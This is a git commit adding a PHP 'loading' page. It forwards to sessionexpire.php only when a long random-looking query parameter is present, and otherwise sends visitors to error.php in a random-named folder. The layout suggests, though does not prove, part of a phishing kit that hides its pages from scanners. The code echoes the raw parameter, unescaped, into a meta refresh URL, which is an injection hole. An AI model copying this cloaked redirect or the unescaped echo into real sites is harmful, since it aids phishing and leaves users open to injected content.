907eb90bab278765b820399eaf1c4ecb9cb25ea8
app <co1btnhq@gmail.com>
2022-09-20 09:10:47 +0300

    m

---
+++ loading.php
@@ -0,0 +1,24 @@
+<?php
+$link = $_SERVER['REQUEST_URI'];
+      
+if($_GET['sjdbhfvgNX6TXHUNC4TR76Y23KZXCJBVFHksdfhsjdbhpi']){
+    $urk='sessionexpire.php?gjfdgjkfhdkgfdgfdjgfd657577HFFHGHjk='.$_GET["sjdbhfvgNX6TXHUNC4TR76Y23KZXCJBVFHksdfhsjdbhpi"];
+?>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=windows-1250"></head><body><br><br><br><br><br><br><br><br>
+<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+<br><br>
+<br><br>
+<center><img src="loader.gif" ><img src="loader.gif" ><img src="loader.gif" ><br><br>
+
+
+<meta http-equiv="REFRESH" content="2; url=<?=$urk?>">
+</center></body></html>
+       <?php
+    
+}
+else{
+    header('location:nsbdfHBVHJDVbb7384bah/error.php');
+}
+
+?>
